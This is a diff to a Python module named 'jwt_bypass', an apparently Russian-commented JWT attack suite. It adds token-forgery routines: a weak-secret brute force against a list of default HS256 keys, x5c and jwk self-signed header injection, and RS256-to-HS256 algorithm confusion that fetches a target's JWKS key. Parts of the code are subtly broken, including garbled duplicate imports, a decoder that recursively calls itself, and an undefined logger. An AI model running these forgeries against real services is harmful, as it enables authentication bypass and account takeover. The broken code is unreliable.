@@ -1,5 +1,7 @@
 """jwt_bypass — JWT attack suite: none, alg confusion, kid injection, jku/x5u"""
-import base64, json, hmac, hashlib, re, os, time
+import base64
+import hmac
+import hashlib, json, hmac, hashlib, re, os, time
 from core.http import HttpClient
 
 def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
@@ -47,6 +49,116 @@ class JwtBypass:
             new_h = dict(header); new_h["kid"] = kid_val
             forged = b64e(json.dumps(new_h).encode()) + "." + b64e(json.dumps(payload).encode()) + "."
             attacks[f"kid_{kid_val[:10]}"] = forged
+
+        # 5. weak-secret brute (HS256 с дефолтными секретами)
+        WEAK_SECRETS = [
+            "secret", "changeme", "password", "123456", "admin", "jwt",
+            "secretkey", "secret_key", "jwt_secret", "supersecret",
+            "your-256-bit-secret", "your_jwt_secret", "key", "test",
+            "dev", "development", "production", "private", "token",
+            "mysecret", "default", "jwtkey", "HS256", "shhhh",
+        ]
+        try:
+            from base64 import urlsafe_b64decode as _b64d
+            parts = token.split(".")
+            if len(parts) == 3:
+                msg = (parts[0] + "." + parts[1]).encode()
+                sig = parts[2]
+                def _b64d(s):
+                    s += "=" * (-len(s) % 4)
+                    return _b64d(s)
+                for sec in WEAK_SECRETS:
+                    mac = hmac.new(sec.encode(), msg, hashlib.sha256).digest()
+                    if _b64d(sig) == mac:
+                        attacks[f"weak_secret_{sec}"] = token
+                        print(f"  [!] WEAK SECRET: {sec}")
+                        logger.finding("jwt_weak_secret", "critical", sec)
+                        break
+        except Exception:
+            pass
+
+        # 6. x5c injection — self-signed cert in header
+        try:
+            from cryptography import x509
+            from cryptography.hazmat.primitives import hashes, serialization
+            from cryptography.hazmat.primitives.asymmetric import rsa
+            from cryptography.x509.oid import NameOID
+            import datetime
+            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+            subj = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "attacker")])
+            cert = (x509.CertificateBuilder()
+                    .subject_name(subj).issuer_name(subj)
+                    .public_key(key.public_key())
+                    .serial_number(x509.random_serial_number())
+                    .not_valid_before(datetime.datetime.utcnow())
+                    .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=1))
+                    .sign(key, hashes.SHA256()))
+            der = cert.public_bytes(serialization.Encoding.DER)
+            x5c = base64.b64encode(der).decode()
+            new_h = dict(header)
+            new_h["x5c"] = [x5c]
+            new_h["alg"] = "RS256"
+            attacks["x5c_selfsigned"] = b64e(json.dumps(new_h).encode()) + "." + \
+                b64e(json.dumps(payload).encode()) + ".AAAA"
+        except ImportError:
+            pass  # cryptography не установлен — пропускаем
+        except Exception:
+            pass
+
+        # 7. jwk self-signed — клиент присылает публичный ключ в header
+        try:
+            from cryptography.hazmat.primitives.asymmetric import rsa
+            import json as _j
+            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+            pub = key.public_key().public_numbers()
+            def _int_b64(i):
+                b = i.to_bytes((i.bit_length() + 7) // 8, "big")
+                return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+            jwk = {"kty": "RSA", "n": _int_b64(pub.n), "e": _int_b64(pub.e), "alg": "RS256", "use": "sig"}
+            new_h = dict(header); new_h["jwk"] = jwk; new_h["alg"] = "RS256"
+            attacks["jwk_selfsigned"] = b64e(json.dumps(new_h).encode()) + "." + \
+                b64e(json.dumps(payload).encode()) + ".AAAA"
+        except Exception:
+            pass
+
+        # 8. alg confusion RS256 -> HS256 (подпись публичным ключом как HMAC-секретом)
+        # пробуем, если публичный ключ доступен через /.well-known/jwks.json или /jwks
+        for jwks_path in ["/.well-known/jwks.json", "/jwks.json", "/.well-known/jwks"]:
+            try:
+                base = session.target.rstrip("/")
+                rj = http.get(base + jwks_path)
+                if not rj or rj.status_code != 200:
+                    continue
+                jwks = rj.json()
+                if "keys" not in jwks:
+                    continue
+                # собираем PEM из n/e первого ключа
+                k0 = jwks["keys"][0]
+                if k0.get("kty") != "RSA":
+                    continue
+                import json as _j
+                def _b64d_pad(s):
+                    s += "=" * (-len(s) % 4)
+                    return base64.urlsafe_b64decode(s)
+                n = int.from_bytes(_b64d_pad(k0["n"]), "big")
+                e = int.from_bytes(_b64d_pad(k0["e"]), "big")
+                # публичный ключ как PEM (упрощённо через cryptography)
+                try:
+                    from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
+                    pubkey = _rsa.RSAPublicNumbers(e, n).public_key()
+                    from cryptography.hazmat.primitives import serialization as _ser
+                    pem = pubkey.public_bytes(
+                        _ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo)
+                    new_h = dict(header); new_h["alg"] = "HS256"
+                    msg = b64e(json.dumps(new_h).encode()) + "." + b64e(json.dumps(payload).encode())
+                    mac = hmac.new(pem, msg.encode(), hashlib.sha256).digest()
+                    attacks[f"alg_confusion_{jwks_path}"] = msg + "." + base64.urlsafe_b64encode(mac).rstrip(b"=").decode()
+                    print(f"  [+] alg confusion prepared via {jwks_path}")
+                except Exception:
+                    pass
+            except Exception:
+                continue
+
 
         # 4. jku / x5u header injection
         for field in ["jku", "x5u"]:
